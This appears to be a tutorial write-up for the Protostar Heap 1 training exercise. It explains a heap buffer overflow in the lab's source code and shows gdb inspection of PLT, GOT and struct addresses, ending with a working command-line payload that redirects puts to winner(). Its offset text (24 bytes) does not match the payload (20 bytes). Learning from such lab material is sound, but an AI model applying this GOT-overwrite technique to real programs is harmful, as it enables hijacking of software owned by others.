###Introduction

[Heap 1](https://exploit-exercises.com/protostar/heap1/) is an example of exploit a buffer overflow in the heap. Below is the source code we must exploit

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

  

struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```

###Exploit

The vulnerabile lines of this source code are 
`  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);`
  Our goal will be to overwrite the function pointer address of printf and replace it with a call to the winner function.
  We can exploit this code by following these steps:
  1. Determine address of `printf` call
  2. Determine address of `winner` call
  3. Determine memory address of `i1->name` and `i2->name`. 
  4. Overwrite `i2->name` (this is a pointer) with the location of the PLT address of `printf`. Doing this will 
  cause `strcpy(i2->name, argv[2]);` to overwrite the PLT address with the address to `winner`
  
  Here is a view of the output of `disas main` in gdb ![link](https://github.com/runnersaw/SoftSysCalamitousCaribou/blob/master/Security/protostarExploits/Screen%20Shot%202017-02-23%20at%2012.20.47%20PM.png)
  1. If we run our file in GDB and then call `disas main` we can see where the structs are allocated in memory and also find
  the location of `printf`. We see when doing this that `printf` has been replaced with a call to `puts`. However, the same logic
  applies to this as it would to `printf`  
  
  `0x08048561 <main+168>:  call   0x80483cc <puts@plt> ` Shows us where puts is being called from. It is not explicitly being called
  but instead is going to an address in the PLT which then contains the address of `puts`. We can use GDB to look at the instruction 
  being called at that address in order to see the location of the PLT address. We then know this is the address we want to overwrite.  
  
  Running `x/i 0x80483cc` shows us `0x80483cc <puts@plt>: jmp *:0x8049774`  This instruction tells us that it jumps to the address 
  0x8049774 which itself is a pointer to another address. This address being the location of `puts`. 
 
  2. Finding the address of `winner` is easy. While our program is open in gdb if we run `p winner` we get the output of
  `$1 = {void (void)} 0x8048494 <winner>`. Showing us that `winner`'s address is `0x8048494`  
  
  
  3. In order to find the addresses of the pointers for the `name` fields we must first create a breakpoint in our code after they
  have been allocated. `break *main+161` will put one at the last line of code so we can see what everything has been allocated to.  
  
  We need to see what the address of the structures themselves was. To do this, lets run the program in GDB with values we know for
  both `i1` and `i2`. `r AAAAAAAA BBBBBBBB` That command will do that. We can tell by looking at our disassembled main function that
  `mallac` allocated `$esp +0x14` for `i1` and `$esp + 0x18` for `i2`. So if we inspect the memory addresses around that location we should
  be able to find the pointer to the structure. When we have this pointer we can view find the pointer to `name`
  `x/x $esp+0x14` gives us the address `0x0804a008`. Now we can inspect the memory around this address.  
  `x/2x 0x0804a008` gives us `0x00000001 0x0804a018` This shows that the `priority` field of the struct is 1 and the `name` field is
  a pointer to `0x0804a018`. Running `x/x 0x0804a018` outputs `0x41414141` confirms that the contents of `0x0804a018` are the first
  user input. We can repeat this process with the location of the second structure, `$esp + 0x18`. We find that `i2->name` is `0x0804a038`.
  
  So we now know if we write 24 extra bytes to `i1->name` whatever we write next will now be written in the location of `i2->name`.  
  
  Now comes the really confusing pointer chain. So `strcpy(i2->name, argv[2]);` will write into the contents of `argv[2]` into the address
  `i2->name` points to. So first we write the address of the PLT address for `puts` (0x8049774) into `i2->name` to using the buffer 
  overflow. Then we can use `argv[2]` to overwrite the pointer to `puts` with the memory address of `winner`.  
  
  So this command will successfully run winner `./heap1 `python -c 'print "A"*20+"\x74\x97\x04\x08"+" "+"\x94\x84\x04\x08"'``
  
  
  
